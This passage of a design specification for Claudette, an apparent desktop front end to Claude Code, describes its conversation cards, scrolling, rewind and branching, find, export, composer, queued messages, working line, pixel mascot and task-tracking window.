| Thinking | A quiet **Thinking** card; click its line to expand. Settings → Conversation → **Show thinking expanded** starts new rows expanded instead. Right-clicking a row gives **Collapse all thinking** and **Expand all thinking**, for the tab alone: every row in it, subagents' groups included, and new rows start the same way from then on, whatever Settings says. The tab keeps the choice, and a copy of it (**Duplicate tab**, **Branch from here**) takes it. |
| Tool call | A tile in the **Tool calls** card that holds a run of calls ([§18](#conversation-cards)): status dot, icon, the tool and its time, what it worked on (file, command, search pattern), how it went (*"120 lines · 0.3s"*, *"Failed · 2.1s"*) and its output's first line. A click opens its detail under the tiles, with the full input and output; an output over 20,000 characters shows its start, with **Show all (n KB)**. **Open in a window** follows the call in a window of its own. Images in the result (a Read of an image, a screenshot) show under it, and open full size ([§18](#images-from-claudes-tools)). |
| Edit / Write | The tile shows `+added −removed`; its detail has an inline diff, **Open** for the file in the editor or the OS's app, and **Open diff** for the file in the diff view ([§8](#8-file-changes--diff-view)): from before Claude's first change in this session to the file now, as Changed files shows it. |
| Bash | The tile shows the command; its detail has the output, in a monospace font. What git did shows as chips under it, from the result's `gitOperation`: *"Committed 1a2b3c4 on main"*, *"Pushed main"*, *"Rebased onto origin/main"*, *"Opened PR #42"* (a link to the pull request). A command that reached its time limit says so and that it carries on in the background (`timedOutAfterMs`), and one in the background says *"Running in the background"* or *"Moved to the background"* (`backgroundTaskId`, `backgroundedByUser`). |
| Subagent (Task) | A one-line card of its own, with its result line (its report), whose click shows that agent's work in the tab ([Subagents](#subagents)). A background subagent's card stays running until it finishes. The agent map shows every subagent as a tree ([§18](#agent-map)). With Settings → Conversation → **Show subagents' work** on **In the conversation**, the card's line opens that agent's own cards under it instead. |
| To-do list | Pinned checklist at the top of the conversation while it exists; its line closes it to that one line. A slim rule marks where each task starts, between cards, and a one-line **Tasks** card at the end of a turn that changed the list says where it stands ([Tasks](#tasks)). |
| Claude Doc | A doc Claude writes on claude.ai with the Docs connector: a link on the call's tile, and a one-line card with **Open** at the end of the turn ([Claude Docs](#claude-docs)). |
| Permission prompt | A card with buttons, in the caution colors while it waits; quiet once answered. See [§7](#7-permission-prompts). |
| Errors / API retries | A one-line card: red for an error, amber for a warning. Other notes are quiet ones. |
| Turn summary | Two cards after each turn ([§18](#conversation-cards)): **Modified files** when it changed files, each with its counts, opening its changes in that turn ([§8](#changes-per-turn)), and **Turn**: duration, tokens, model, what came from the prompt cache, and the tool calls it made. |

Scrolling follows new output unless the user has scrolled up; a "Jump to latest" button appears when they have, an accent pill with a shadow at the conversation's bottom right, so it stands out over the text in either theme. Marks beside the scroll bar, and F3 and F4, find the user's messages and Claude's replies again ([§18](#conversation-cards)). Scrolling up with the wheel, a scroll bar, the keys or a swipe counts at once, even when output arrives in the same frame, so the view doesn't take the reader back to the bottom; a move the list makes by itself (correcting its estimate of the messages above) doesn't. Following holds still: the screen's worth either side of the view stays built, so a message coming into view already has its height. With only the items in view built, the list measured shorter, then taller, frame after frame, and the view jumped with it. A message's Markdown is parsed once and kept with it (`Conversation/KeptMarkdown`, for replies and plans), so a reply built again shows at once; LiveMarkdown's own renderer parses in the background, so a reply built again used to start one line tall.

The conversation is virtualized: only the items in view, and a screen's worth either side, have controls, so a long session (a restored one with thousands of tool calls, say) costs no more to show than a short one, and tabs in the background hold no more than a screenful. The list (`Controls/ConversationPanel`, also used in subagent groups) remembers each item's height once it has laid it out, and items it hasn't yet are taken to be the average height. So an item changing height, such as a reply as it streams in or a card opening, moves only the items after it. While the UI is idle, it lays out the items it hasn't at this width, half a screen's worth at a time from the top (each pass costs no more than scrolling half a screen), and puts their controls back: once a long conversation has been open a moment, or its width has changed, every item has its own height, so the scroll bar and its marks hold still as the user scrolls. The items above the view changing height move the view with them, so the list builds around where the view is going rather than where it was, and an item laid out this way leaves the height taken for the rest as it was. What's in view holds still to the pixel while it does: the height taken for an item not laid out yet is a whole number of the screen's pixels, as laid-out items' heights are, and the scroll viewer may keep any built item still, not only those the list last knew to be in view, which lag a pass behind a jump such as to the end of a conversation that just opened. A tab in the background lays out nothing until it's shown. An image in a reply that loads later still changes its height when it's in view. Avalonia's own virtualizing panel instead found its place again from the average height whenever one of its items changed height. With one-line rows beside replies a page long it found the wrong place, so a streaming reply had it build every message around it again on every frame: each rebuilt reply blinked as its Markdown rendered again, and the work could stall the app. Scrolling to a card (from the agent map or the Processes page) brings its top-level item into view first, then the card inside it. An expanded Edit or Write card's inline diff is virtualized the same way; the diff window's lists always were.

### Copy and times

- **Code blocks.** A code block has a header line with its language, **Wrap lines** and **Copy**.
  - Copy puts the block's code on the clipboard, without the Markdown fences and with the OS's line endings, and the button says *Copied* for 1.5 seconds.
  - The buttons are LiveMarkdown's, in Claudette's own template for the block. The tab does the copying, through the same clipboard as everything else. Code blocks in the agent map's prompts and reports work the same way.
- **Messages.** A message's card says when it was sent at the right of its header line, and, while the card is pointed at or has the focus, has **Copy message** and **Add to scratch pad** before it ([§18](#scratch-pad)). A user message's chip also has **⋯**, its menu to go back to it ([below](#rewind-and-branch)); a finished reply's has **Show as the plan** ([Tasks](#tasks)).
- **Selected text.** Right-clicking text selected in the conversation, a reply's across its Markdown included, gives **Copy**, **Quote in reply** and **Add to scratch pad**; with nothing selected, a message's gives **Copy message**, **Quote message** and **Add message to scratch pad**, and a finished reply's **Show as the plan** too. A code block's header has **Add to scratch pad** beside **Copy** too ([§18](#scratch-pad)).
  - **Quote in reply** puts the text at the end of the composer as a Markdown quote, each line starting `> `, with an empty line after it to write under, and the focus there, so a reply can answer one part of what Claude said. **Quote message** does the same with the whole message, as **Copy message** copies it.
  - It also shows while the message has keyboard focus, so Tab reaches the button.
  - A reply copies as its Markdown, as Claude wrote it. A user message copies as it was sent, with its quick suffixes after a blank line.
  - The button says *Copied* for a moment, as on code blocks.
- **Times.** The time is short, in the current culture: *14:05* today, *Mon 14:05* in the week before, else the date and time. Its tooltip has the full date.
  - A live message takes the time it was added: when it was sent, or when the reply started.
  - A restored message takes its transcript entry's `timestamp`. An entry without one shows no time, rather than the time it was restored.
  - Selecting a tab brings "today" up to date, for a tab left open overnight.

### Rewind and branch

A user message's **⋯** menu goes back to it. Claude Code does the work: a resume with `--resume-session-at <entry>` keeps the conversation up to and including that transcript entry, and the `rewind_files` control request puts back files it kept copies of.

- **Where to go back to.** Each prompt knows its transcript id (`uuid`) and the entry just before it, the point to resume at.
  - A live prompt gets its id when Claude Code echoes it back (`--replay-user-messages`): the echo's `uuid`, which is the id Claudette sent it with ([§13](#integration-with-claude-code)), so the echo finds its prompt even when it reads differently. Its point is the last entry of the main conversation before the echo, an assistant message or tool results, so a prompt sent while Claude worked follows what it actually came after. A restored prompt has both from its transcript entry (`uuid`, `parentUuid`), which may point at an entry that shows nothing, such as an attachment.
  - The first prompt of a conversation, and the first after `/clear`, has no point: going back to it starts a new session.
- **Edit and resend…** The conversation goes back to just before the message, and the message (its text and images) goes in the composer to change and send.
  - Only while Claude isn't working: going back mid-turn would cut a turn in half. The menu says so in a note instead.
  - The tab carries on as a copy (`--fork-session`), so the session as it was stays in History. Claudette stops the tab's `claude`, reads the transcript again up to the point, and starts it again there; the copy gets its own id with its first turn, as **Open a copy** does ([§9](#session-library-sync-across-machines)). Until that first turn the copy, and its point, stay saved: if Claude Code or Claudette stops before anything is sent, the tab starts as the same copy again rather than carrying on the original. **Duplicate tab** of such a copy copies it up to the same point.
  - For the last prompt, it also passes `--resume-drops-turn <prompt id>`: Claude Code refuses the resume rather than drop more than that turn.
  - When Claude Code has copies of files from before the message (a dry run of `rewind_files` says which changed since), the confirmation offers **Go back and restore files** and **Go back, keep files**. Otherwise just **Go back**.
- **Branch from here.** A new tab in the same folder, a copy of the session up to just before the message, with the message in its composer. The tab it came from is left as it is, and it works while that tab is busy. Branching from the first message opens a new session there.
- **Restore files to before this…** Claude Code puts the files Claude changed since the message back as they were, after a confirmation listing them with their line counts (*Later changes to them, Claude's or yours, are lost*). The conversation stays as it is. It needs the tab's `claude` running, and Claude Code keeping copies: Settings → Claude Code → **Keep copies of files Claude changes, so prompts can be rewound** starts it with `CLAUDE_CODE_ENABLE_SDK_FILE_CHECKPOINTING=true`. Without a copy, a note says why.
- **Duplicate tab** (the tab's menu) opens a copy of the whole session in a new tab, or a new session in the same folder for a tab that hasn't had a turn yet.
- A copy keeps the tab's settings, its kept quick suffixes, whether it syncs, and its files' reviewed marks ([§8](#8-file-changes--diff-view)).
- Fork keeps the copied entries' ids (checked with 2.1.286), so going back again in a copy finds its point in the copy's transcript.

### Find

**Find in the conversation** (`Ctrl/Cmd+F`, or whatever Settings → Keyboard says) opens a bar over the conversation: a search box, *"3 of 12"*, previous and next, and close.

- It looks through prompts, replies, thinking, tool calls with their input and output, notes, hook runs, permission cards' outcomes, the rows where tasks start and where a turn left them ([Tasks](#tasks)), the links and rows naming Claude Docs ([Claude Docs](#claude-docs)), and subagents' groups with everything in them, ignoring case.
- Typing goes to the newest match, as a conversation is read from the bottom. `Enter` goes to the next one and `Shift+Enter` to the one before, wrapping around; `Esc` closes the bar and puts the focus back in the composer.
- Each call in a Tool calls card is a match of its own: the card is marked and the call's tile opens.
- The match is brought into view and its card marked with the selected-row color. A match only in what a collapsed card hides (a tool's output, a thought, a hook's output) opens the card; one in a subagent's work opens its group. A match in a card's header leaves it as it is.
- In that card, the search text is highlighted wherever it shows, ignoring case, in the find color over the text: a reply's Markdown and its code blocks, a prompt, a tool's input and output, a note. Text a box inside the card has scrolled out of sight, such as a long tool output, isn't marked over the cards around it. How it's built: `Controls/FindHighlights`, a layer over the conversation's lists, reads each text block's text as its layout laid it out, asks the layout where each match is, and draws there; it works the marks out again after each layout pass, so they follow scrolling, a card opening and a reply growing. `FindHighlightBrush` is its color.
- New output while the bar is open joins the matches without moving the current one. Pressing the shortcut again goes back to the box with its text selected.
- History searches across sessions, including Claude's replies on request ([§9](#history)).

### Export

**Export conversation…**, in the tab's menu and the command palette, saves the conversation as a file to read or share. The save dialog offers **Markdown** (`.md`, the default) and **Web page** (`.html`, one file with its style inline); the name chosen decides which.

- Prompts and replies in full, with their times. A reply's Markdown is kept as written; in the web page it's shown as text, so nothing in it runs.
- Tool calls as one line each with their result's summary, and a Bash command with its output (its first 4,000 characters). A call that made or changed a Claude Doc has the doc's link instead ([Claude Docs](#claude-docs)). A subagent is one line with its report. Permission cards' outcomes, a plan's text, where each task started (*Started task #3: Run the migration*), failed hooks and errors are kept; Claudette's other notes, and thinking, are left out.
- The file is written to a temporary name and renamed. The tab says where it went.

### Composer

- Multi-line text box. `Enter` sends, `Shift+Enter` adds a new line. Settings → Keyboard → **Send with** can make it `Ctrl/Cmd+Enter` to send and `Enter` for a new line instead ([§14](#keyboard-shortcuts)), and so can the send key chip before **Send** (below).
- What's typed is kept: quitting Claudette keeps it with the tab, and **Stash** puts it aside for any tab ([Drafts and the stash](#drafts-and-the-stash)).
- **Stop.** A Stop button replaces Send while Claude is working, and `Esc` does the same. Stopping interrupts the current turn; it does not close the session.
- You can type and send while Claude is working; the message is queued and delivered to the session. See [Queued messages](#queued-messages).
- **Earlier prompts.** `Up` on the composer's first line brings back the tab's previous prompt, as a terminal's history does, and again for the one before; `Down` on its last line comes forward, back to what was being typed. A restored tab has its transcript's prompts too. Typing ends it, so the next `Up` starts from the newest again. The same prompt twice in a row is kept once, and a tab keeps its last 200. With the autocomplete list open, the arrows move in the list instead.
- `/` opens slash-command autocomplete (built-in plus the project's custom commands), and `@` file autocomplete for the tab's working folder. See [Autocomplete](#autocomplete).
- **Suggested prompts.** With Settings → Conversation → **Suggest my next prompt** on, the empty composer shows the prompt Claude Code predicts the user will send next, and `Tab` takes it. See [Prompt suggestions](#prompt-suggestions).
- Drag and drop, paste, or pick with the attach button images and files to attach them. See [Attachments](#attachments).
- Per-tab controls in the bar at the foot of the box: the attach button (a paper clip), **Suffixes ▾** ([§5](#quick-suffixes)), **Stashed (2) ▾** while the stash holds messages ([§5](#drafts-and-the-stash)), model, effort level, permission mode, the **Agents** button while the tab has subagents ([§18](#agent-map)), the **running tasks** chip while Claude Code has work going in the background (*"● 2 running tasks"*, [below](#running-tasks)), context window usage %, tokens used, and the send key chip just before **Send**.
- **The send key chip.** Always shown, just before **Send**, it says which key sends: *⏎ sends*, or *Ctrl+⏎ sends* (*⌘⏎ sends* on macOS), with the modifier written as the app writes keys (`KeyChord.Display`). A click, or `Space` with it focused, switches between the two. It's Settings → Keyboard → **Send with** ([§14](#keyboard-shortcuts)), one setting for every tab, saved as that page saves it: every tab's chip and placeholder follow, as does an open Settings window, and settings sync carries it as before. Its tooltip says what each key does and what a click does (*"Enter sends, Shift+Enter starts a new line. Click to send with Ctrl+Enter instead."*), its name for screen readers says it in words (*Enter sends*), and **Send**'s tooltip names the key too: *Send (Enter)* or *Send (Ctrl+Enter)*.
  - It looks like the counts beside it, a flat button with muted text, in both styles and densities.
  - The ⏎ is drawn from Inter, which Claudette ships (Avalonia's Inter font, Fluent's own) and which has it in every weight, so it reads the same on Windows, macOS and Linux; the rest of the chip is in the bar's font. Segoe UI hasn't got ⏎, and font fallback would draw it from whichever font has, such as a code font.
  - How it's built: `ShortcutTips` (`Services/Shortcuts.cs`) words the chip, its tooltip and **Send**'s, and `TabViewModel.SwitchSendKeyCommand` switches the setting. `KeyboardAndSettingsTests` (every tab and the open Settings window follow), `ComposerExtrasUiTests` (the chip in both modes, rendered) and `MainWindowTests` (the chip and **Send** in view in a narrow pane).
  - **Still to verify:** the chip beside the counts on real Windows, macOS and Linux desktops, in both styles and densities (so far rendered headlessly).
- **The status line**, under the box: the working folder, the tab's status (and **Restart** when it has stopped), and at its right how Claude's plan and tasks are going, which opens the Tasks page ([Tasks](#tasks)), then last **ⓘ**, the tab's info card ([Tab info card](#tab-info-card)).
- **The bar keeps Send in view.** The choices (model, effort, permission mode) are at its left, and the counts (processes, Agents, running tasks, Files, context, tokens) with the send key chip and **Send** at its right. When they don't all fit on one line, as in a narrow window, the right-hand group moves to a second line under the choices, still at the right, rather than being pushed out of sight (`ControlBarPanel`). In a pane too narrow even for the group on a line of its own (tabs side by side, §18, or beside a docked tool window), the group wraps onto another line, with Send still last at the right, and the choices wrap the same way. Nothing in the composer runs past its edge: the status line under the box trims the folder first, then the status, with the whole status in its tooltip.

### Queued messages

A message sent while Claude is working waits its turn: Claude Code reads it at the next tool call, or after the reply that's being written ([§13](#integration-with-claude-code), "Messages sent while Claude is working").

- Its card says *"Queued: sent when Claude can take it"*, with **Cancel**, until Claude Code takes it (its echo comes back). So does a check-in waiting the same way.
- **Stop** takes back everything that's waiting along with the turn, rather than letting it run as soon as the turn ends: the `interrupt` has `cancel_queued`, when Claude Code lists the `interrupt_cancel_queued_v1` capability. Without it, Stop is the plain interrupt and what waits runs afterwards, as before.
- **Cancel** takes one message back on its own (`cancel_async_message`, undocumented). If Claude Code has already taken it, or can't, the card stays as it is and a note says so.
- A message taken back loses its card, and what the user wrote goes back into the composer with its images and large pastes, ahead of anything typed since, so nothing is lost; a note says how many were taken back. A check-in taken back just goes.
- **Queue instead.** Settings → Conversation → **Messages sent while Claude works** chooses between sending them into the turn, as above (the default), and queueing them: Claudette holds each message until the turn ends, then sends it as the next turn, one per turn, oldest first. It's for lining up the next task without turning Claude from the one under way.
  - A held message's card says *"Queued: sent when this turn ends"*, with **Send now**, which sends it into the turn after all (or as a turn, if Claude has finished), and **Cancel**, which takes it back without asking Claude Code, which never had it.
  - **Stop** takes back held messages too, with what Claude Code was holding. So does Claude Code exiting: they can't go to a process that's gone.
  - A turn a usage limit stopped doesn't send the next one, which the limit would stop too: held messages wait for the next turn to end, or for **Send now** ([§6](#continuing-after-a-limit-resets)).
  - A message sent while nothing is working goes at once, as always. Claudette's own messages (check-ins, continuing after a limit) always go into the turn.

### Working line

While Claude works, a line above the composer says so, the way Claude Code's terminal spinner does: *"✻ Noodling… 42s · 3.1k tokens · Esc to stop"*.

- **The glyph** twinkles through · ✢ ✳ ✶ ✻ ✽ and back, in the accent color.
  - Every frame comes from Segoe UI Symbol on Windows. Left to font fallback, which tries the fonts the app already uses first, ✶ came from Consolas once a code block had used it: smaller, thinner and taller than the rest.
  - The line holds still whatever font a frame comes from: the glyph is centered on the line and never makes it taller (`Controls/Overhang`), since a taller frame lifted the line, and the conversation above it, as it twinkled.
- **The verb** is picked at random and changes every 8 seconds, never to the same one twice in a row.
- **Then:**
  - how long the turn has run;
  - its tokens so far (from each call's usage, as the tab's token count, [§6](#per-tab-context));
  - the Stop shortcut, as currently bound.
- **What Claude is doing.** While one of the main agent's tools runs, from its `tool_use` to its result, the verb gives way to what the tool is doing, then comes back:
  - *"Running dotnet test…"*, *"Reading TabView.axaml…"*, *"Editing App.cs…"*, *"Searching for TODO…"*, *"Fetching code.claude.com…"*, *"Using create_issue (github)…"*;
  - the newest call when several run at once, *"Reading b.cs and 2 more…"*, and *"Running 3 agents…"* for a fan-out;
  - a subagent's own calls show on the agent map ([§18](#agent-map)), not here;
  - hovering the line shows the running calls in full, one per line: *"Bash: dotnet test Claudette.slnx --filter …"*;
  - **Show what Claude is doing** (Settings → Conversation, on by default) turns it off, leaving the verb.
- **When it shows.** From the turn's start to its end. It hides while a permission prompt, question or plan waits on the user, and the turn's time keeps running meanwhile. It only animates while its tab is on screen (the selected one, or one of the tabs side by side, [§18](#split-panes)): a tab working in the background keeps counting its turn without waking the UI, and catches up when it's shown. Closing a tab mid-turn stops its line.
- **Verbs.** Claudette has its own list, since Claude Code doesn't publish its built-in one. Claude Code's documented `spinnerVerbs` setting changes it:
  - `"append"` adds the user's verbs;
  - `"replace"` shows only theirs (an empty list keeps the built-in ones).
  - The setting is read from the tab's `.claude/settings.local.json`, then `.claude/settings.json`, then the user's `settings.json` in Claude Code's config folder (`configDirectory` from `claude auth status`). The first file that sets it wins; managed settings aren't read.
  - It's read as the tab's session starts, so a change shows from the next session.
- **In a narrow pane** the verb trims first (*"Running cd /d/Work…"*), then the time and tokens, so the line stays within the composer rather than running over a docked tool window beside it.
- **Turning it off.** **Show fun words** (Settings → Conversation, on by default). Off, the line says *"✻ Working…"* with a still glyph, and still shows the time, tokens and Stop shortcut.
- Claude Code's spinner tips (`spinnerTipsEnabled`, `spinnerTipsOverride`) aren't shown.

### Claudette on the composer

✅ Built 2026-10-10. Claudette, the app's pixel mascot, stands on the composer box's top edge and does little things now and then, to keep the user company, the way a small Clawd sits above the Claude apps' message box. She's there unless Settings → Appearance → **Show Claudette on the composer** is turned off (it's on by default), with her **Size** (small, medium or large: 24, 36 or 48 pixels tall), **How often** she does something (lively, every 10 to 30 seconds, the default; or calm, every 30 to 90) and whether she **shares tips**; they sync with the other Appearance settings.

![Claudette on the composer: climbing up, looking around, dancing, tossing a ball, sitting on the edge, juggling, hammering, confetti, a twirl, a heart, and falling off behind the box to climb back up](docs/screenshots/claudette.gif)

- **Where she stands.** On the box's top edge, 3 pixels a cell of her 12-cell sprite at the medium size. She's drawn behind the box, so whatever of her drops below the edge is hidden by it, and she rises and falls with the box as it grows with lines of text or attachments, and shrinks after sending. She keeps to the last third of the edge, and her home is over the Send button (or Stop, in its place): she comes up there, and wanders from it but tends to walk back.
- **Keeping clear.** She only stands on the part of the edge nothing sits on: right of the working line's words and the suffix chips, between the box's rounded corners, and clear of **Jump to latest**. When something leaves too little of the last third free, she keeps to the right end of the free stretch nearest home. While something spans the box (a check-in or limit bar, folder trust, a note about an attachment, a thread's strip, a dialog over the conversation), or the room left is too small for her, she ducks behind the box, and climbs back up once it goes.
- **What she does.** She stands about, blinking every few seconds, and every so often does something: looks around, walks a few steps one cell at a time (away from home, more often back to it than further off), leans on the edge with her arms folded on it, sits on it with her legs over the front of the box, swinging, stretches, waves, hops, dances (swaying with one arm up, then both, then the other), twirls (the back of her head half-way round), yawns, taps her foot, tosses a ball up and catches it, looks puzzled with a "?" over her, blows a heart that floats up, or sneezes, with a puff off to her side. Now and then, at most every three minutes, she looks down, flails and falls off behind the box; a moment later her hands reach up and grip the edge, and stay there while she pulls herself up between them, peeks over it, looks each way and climbs back up. She climbs up the same way when she first appears. Falls and jumps go by gravity; everything else moves a whole cell at a time, as pixel art does.
- **While Claude works**, she works too, with what suits the tool it's running (the main agent's newest call; a new tool shows from her next burst of work, not mid-way, since tools change many times a second): a magnifying glass for reading and searching files (`Read`, `Grep`, `Glob`), a hammer for editing them (`Edit`, `MultiEdit`, `Write`, `NotebookEdit`), a little terminal whose output scrolls for commands (`Bash`, `PowerShell`, `BashOutput`, `Monitor`), a turning globe for the web (`WebFetch`, `WebSearch`), and otherwise her laptop. While subagents run she juggles, a ball for each (up to three). In plan mode she holds a clipboard, and writes on it rather than typing. A turn running three minutes, she ducks behind the box and comes back up with a coffee, which steams on the edge beside her till the turn ends. With the context window nearly full ([§6](#per-tab-context)) she wipes her brow now and then; while Claude Code compacts the conversation (its `system/status` says `compacting`), she sweeps the edge with a broom.
- **Reacting to the tab.** She waves while a prompt waits for the user (straight away, then every 15 seconds), and dozes by a small hourglass while a usage limit holds the task. When a turn finishes she hops; when it fails (an error, not the user's Stop), she's dizzy, stars going round her head, and shakes it off. When Claude's last task is done as it works ([Tasks](#tasks)), confetti bursts out of her; when every file the tab changed is reviewed ([§8](#8-file-changes--diff-view)), she stamps the edge, which leaves a green check mark. After five minutes with nothing happening (three late at night) she naps, leaning on the edge with z's rising; typing wakes her.
- **Other tabs that need you.** While another tab waits on the user and this one doesn't, she turns toward the sidebar and waves at it, with an arrow, saying so in a bubble: *"Another tab needs you · Ctrl+J"* or *"2 tabs need you · Ctrl+J"*, with the shortcut to the next waiting tab as it's bound ([§14](#keyboard-shortcuts)). Straight away when a tab starts waiting, then every 20 seconds.
- **Tips.** Now and then, at most every ten minutes, never within half a minute of the user typing, and only if Settings says so, she holds up a tip in a bubble: a shortcut as it's bound now (the next waiting tab, the command palette, find, find in files, the stash, quick suffixes, History, zoom), or *"Up brings back your earlier prompts"*, *"Drop a file on the message box to attach it"*, *"Right-click me if you'd like me to go"*.
- **Reacting to the user.** Standing about, she looks toward the pointer when it's well to one side of her. Sending a message, she throws a paper plane up into the conversation. A file dragged over the composer has her arms up, ready to catch it; a file or image attached (dropped, pasted or picked) drops from above into her hands, and she puts it in the box. A paste too big for the box ([Attachments](#attachments)) has her stagger under a heavy crate, drop it in, and wipe her brow. Typing her name at the end of the message, she waves back and blows a heart.
- **Clicking and carrying her.** A click startles her: she jumps with a "!" over her head. A second click straight after (within a second and a half) tips her off the edge, to climb back up. Poked ten times within a minute, she turns her back under a storm cloud for a few seconds, and clicks do nothing till she comes round. Pressing on her and dragging picks her up: she hangs from the pointer, arms up, wherever it goes. Let go above the edge, she falls onto it where she is (anywhere along the free stretch of edge) and, outside her patch, walks back home; let go below it, she falls behind the box and climbs back up. Right-click gives a game against her ([§18](#games-with-claudette)), **Hide Claudette**, which turns the setting off, and **Claudette settings…**, which opens Settings → Appearance at her settings. Only her figure takes clicks; the rest of the layer lets them through to the conversation.
- **Her looks.** Her hair tie takes the colour of the tab's group in the sidebar ([Sidebar](#sidebar)), as do the heart she blows and the ball she tosses. She wears a witch's hat in Halloween's last week, Santa's from December 1st to Boxing Day, and a nightcap from 11 at night to 5 in the morning, by the computer's clock; late at night she yawns more.
- **One of her.** She's on the selected tab's composer (the focused pane's, with tabs side by side) and follows the user from tab to tab, keeping her place on the edge, reacting to the tab she's on. She only moves while she's on screen.
- **Motion.** While motion is reduced ([§3](#accessibility)) she stands still at home, in the first pose of what the tab has her doing (standing, working with the tool's prop, sweeping, waving, dozing, or pointing at the sidebar with its bubble), doesn't react to clicks, events or the pointer, and can't be carried.
- **Screen readers** pass her by: she's decoration. What she says in her bubbles is said elsewhere too (the badge and announcements for waiting tabs, [§10](#10-notifications)).

How it's built: `packaging/icon/build-icons.mjs` draws her poses, props and hats from the icon's sprite into `Assets/Mascot/mascot.json` (`Mascot/MascotArt` reads it). `Mascot/MascotDirector` decides what she does, as steps of a pose held for a while, a step sideways, how far down she is (fractional while gravity has her part-way between cells) and what she says (`Mascot/MascotAntics`), timed by the injected clock with nothing ticking between steps. It reacts to a `MascotSituation` (what the tab is doing, its newest tool, its subagents, plan mode, a full context, compacting, other tabs waiting) and to one-off events (`MascotDirector.Events.cs`); `MascotCalendar` picks her hat. `Services/MascotService` holds the one director while the setting is on, passes the settings on, and supplies her lines, the shortcuts as bound now; the selected tab tells it what's happening (`TabViewModel.Mascot.cs`). `Views/MascotLayer` sits in the box's place in `ComposerView`, before it, so the box draws over her, and a second one after it draws what goes in front of the box (her legs while she sits). It draws her through `Views/MascotFigure`, cell by cell, each cell a whole number of screen pixels at the display's scaling and the window's zoom so her edges stay crisp; after each layout pass it works out where on the edge she has room from what the composer stacks above the box (each drawn leaf, so the working line takes only its words) and what `TabView` names to keep clear of, and where home is from where Send is (`MascotRoom`); it follows the pointer for her eyes, turns a press into a poke or a carry, and shows her bubble. The composer doesn't clip what it draws, so she can stand over the conversation's foot. The README's animation (`docs/screenshots/claudette.gif`) is drawn from her art and steps by `MascotPictureTests`, which `screenshots.ps1` runs with `CLAUDETTE_MASCOT_GIF` set.

### Tasks

When Claude keeps a task list (`TodoWrite`, or `TaskCreate` and `TaskUpdate`), the tab has a plan, or Claude wrote a doc on claude.ai ([Claude Docs](#claude-docs)), a **Tasks** tool window comes, with *"2 of 5"* done on its tab. The pinned list at the top of the conversation stays as it was; the page has room for more. A plan shows from the moment Claude starts writing it, every version of it is kept, the conversation marks where each task starts, and the status line, the tab's row and the end of each turn say how far the work has got.

- **The plan**, as Markdown, above the tasks Claude makes from it. It's the newest of:
  - the plan Claude is writing in Plan mode, as it writes it (below), headed *"Drafting since 14:02"*;
  - each plan Claude put up for review (`ExitPlanMode`), with what became of it: *"Waiting for review"*, *"Approved 14:05"*, or *"Sent back 14:03"* with the feedback under it. An approved plan's result carries it (`tool_use_result.plan`), so it shows however it was approved: on its card, in the Claude app ([§18](#remote-control)), or before the tab was restored, whose transcript has it. A plan sent back keeps the text its card had and the feedback given on it. A restored tab has a plan that was sent back only when its transcript holds the text (the call's own `plan`, before 2.1.285), and without the feedback.
  - a reply the user chose with **Show as the plan** (on a reply's chip and its menu, [Copy and times](#copy-and-times)), with when Claude wrote it: *"From Claude's reply at 14:03"*. This is for a plan Claude wrote in a reply rather than in Plan mode, such as one the user approves by answering "go". Choosing another reply while one is the newest replaces it. It's saved with the tab, so a restored tab shows it again while the reply is still in the conversation (a rewind can go back past it) and no plan was approved after it was chosen.
- **The plan as Claude writes it.** In Plan mode Claude writes its plan to a plan file with Write and Edit, and Claude Code lets it change no other file. So while the tab is in Plan mode, the main agent's Write or Edit to a Markdown file (`.md`) is the plan's draft. The page follows each change once it's made: a Write's `content`, or an Edit's replacement (`old_string` with `new_string`, every one with `replace_all`) made to the file as its result had it (`originalFile`), else to the draft so far. Out of Plan mode the plan file is just a file: Claude ticking items off in it after the plan was approved doesn't start a draft that's never put up. Only live: a restored tab's plans come from its versions.
- **Versions.** Each plan is a version, numbered in the session. With more than one, the plan's header says which it shows (*"v2 of 3"*), ‹ and › step through them, and **Changes from v2** shows the version as a line diff against the one before it, in the colors of an Edit card's diff. A draft becomes a version when Claude starts writing, and stays the same version once it's put up for review; a revision after a plan is sent back is the next one. A plan still waiting when its turn ends, as when the turn is stopped, says *"Not answered"*. A new version shows as it comes, unless the user has stepped back to an earlier one.
- **The plan's card** in the conversation ([§7](#7-permission-prompts)) says which version it is from the second on (*"Claude's plan · v2"*), with **Changes from v1**, so a revision can be reviewed by what changed.
- **The pinned list.** Its line, *"To-do · 3 of 7 done"* with a chevron, opens and closes it. Closed, the line goes on to name the task in progress (*"· Running the tests"*), so a long list takes one line. Open, its tasks take at most two fifths of the conversation's height and scroll past that, so a long list leaves the conversation room in a short window (`TabView.PinnedTodoShare`). It opens when Claude starts a list, or starts work on a finished one again, and closes once every task is done; in between it stays as the user left it, however often Claude changes the list. A list closed with tasks left is saved with the tab, so it stays closed when Claudette restarts.
- **Suggesting a reply as the plan.** When Claude starts a new task list (the first `TodoWrite` or `TaskCreate` while the list is empty or every task in it is done), and its latest reply before that has a list of three or more items and is newer than the tab's newest plan, the pinned list asks *"Use Claude's reply from 14:03 as the plan?"*, with **Use as the plan** (as **Show as the plan** does) and **×**. It goes once answered, when a plan comes, or when the list is cleared. Only live, and not saved.
- **Each task:** its state (to do, in progress, done), its number as Claude refers to it (*#3*, for `TaskCreate` tasks), its subject and its description, *"Waiting on #1, #2"* while a task it depends on isn't done, and a line with who's working on it when Claude says (a subagent or teammate), its time, the files changed and the tokens used while it was in progress: *Explore · Took 4m · 3 files · 120k tokens*, *Started 14:05* or *Added 14:02*. **3 files** lists them, by name with the path as the tip, and each opens in the diff view as Changed files shows it ([§8](#8-file-changes--diff-view)). Clicking a task that has started goes to where it started in the conversation.
- The one in progress shows its active form (*"Running the tests"*) in bold.
- **What each task did.** A file change (Edit, Write, MultiEdit, NotebookEdit) and a call's tokens, counted as the working line counts them, go to the task in progress that the agent making the call started, or else that an agent above it did: a subagent's work counts toward its parent's task. An agent with more than one task in progress counts toward none of them, and work while no task is in progress counts toward none. A `TodoWrite` task, and one whose state only a `TaskList` result gave, is the main agent's. A restored tab counts them from its transcript too.
- **Where each task starts.** When a task goes in progress, the conversation gets a slim row there, a rule with the task in it: *"◐ #3 Run the migration"*, with *Started 14:05* at its right, then ☑ and *Took 4m* once it's done. A subagent's task has it in the subagent's group. Clicking it opens the Tasks page. A task that goes back to waiting and starts again keeps its first row. The pinned list's tasks go to their rows too. A restored tab has them, dated by its transcript. Find looks through them, and an export keeps them as a line.
